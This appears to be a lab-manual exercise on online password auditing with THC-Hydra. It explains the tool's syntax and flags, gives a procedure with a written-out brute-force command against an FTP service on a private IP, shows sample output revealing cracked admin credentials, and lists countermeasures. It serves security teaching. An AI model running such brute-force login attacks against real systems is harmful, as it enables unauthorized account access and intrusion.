# Experiment 14: Password Cracking Using Hydra

## Aim
To perform online password authentication auditing using THC-Hydra against an authorized service.

## Theory
THC-Hydra is a parallelized network login cracker supporting numerous protocols (FTP, SSH, Telnet, HTTP-GET, HTTP-POST-FORM, SMB, etc.).
* **Syntax:** `hydra [options] -l <username> -P <wordlist> <protocol>://<target-ip>`
* **Key Flags:**
  * `-l <username>`: Specific username to attack.
  * `-L <userlist>`: Wordlist containing multiple usernames.
  * `-p <password>`: Specific password to test against multiple users.
  * `-P <passlist>`: Wordlist containing candidate passwords.
  * `-t <tasks>`: Number of parallel connection threads (default 16).
  * `-v` / `-V`: Verbose and very verbose output.
* **Countermeasures:** Account lockout policies, rate limiting, multi-factor authentication (MFA), fail2ban.

## Procedure
1. Create a password dictionary (`passwords.txt`).
2. Identify the target service IP and protocol (e.g. FTP on `192.168.1.10`).
3. Launch Hydra: `hydra -l admin -P passwords.txt ftp://192.168.1.10`.
4. Observe authentication attempts and identify successfully matched credentials.

## Sample Output
```text
Hydra v9.2 (c) 2021 by van Hauser / THC - Please do not use in military or secret service organizations
[DATA] max 4 tasks per 1 server, 12 login tries
[ATTEMPT] target 192.168.1.10 - login "admin" - pass "123456" - 1 of 12
[ATTEMPT] target 192.168.1.10 - login "admin" - pass "password" - 2 of 12
[21][ftp] host: 192.168.1.10   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
```

## Result
Successfully performed password auditing using Hydra.
